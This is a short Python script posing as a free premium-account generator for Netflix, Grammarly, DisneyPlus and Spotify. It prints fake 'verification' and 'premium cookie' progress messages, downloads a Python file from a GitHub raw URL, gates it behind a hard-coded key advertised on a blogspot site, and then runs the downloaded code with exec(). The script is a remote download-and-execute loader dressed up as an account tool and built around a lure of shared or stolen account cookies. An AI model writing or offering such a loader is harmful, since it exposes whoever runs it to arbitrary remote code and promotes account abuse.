import time
import urllib.request
class account_gen:
    def account():
        u = input("1:Netflix 2:Grammarly 3:DisneyPlus 4:Spotify\n")
        if u == "1":
            print("Account Downloading From Internet")
            time.sleep(1)
            print("Account Verification..........")
            time.sleep(1)
            print("Key Generate Please Wait.....")
            time.sleep(1)
            print("Account Find From Database")
            time.sleep(1)
            print("Downloading From Database Premium Cookie")
            time.sleep(1)
            print("Start Downloading........")
            code = 'https://raw.githubusercontent.com/PKZOID/Database/main/Netflix.py'
            response = urllib.request.urlopen(code)
            data = response.read()
            time.sleep(1)
            print("download completed successfully")
            print("Enter Key to Unlock")
            print("Key Get From: www.pkzoid.blogpsot.com")
            key = input("Enter Key to Unlock: ")
            if key == "786":
                print("Thanks For Login")
                time.sleep(5)
                print("Login Successful")
                exec(data)
            else:
                print("Login Failed")
                print("Try Get From www.Pkzoid.blogspot.com")
        else:
            print("Try Agin")


user = input("Enter user name: ")
print("Uplod Your username Please Wait....")
account_gen.account
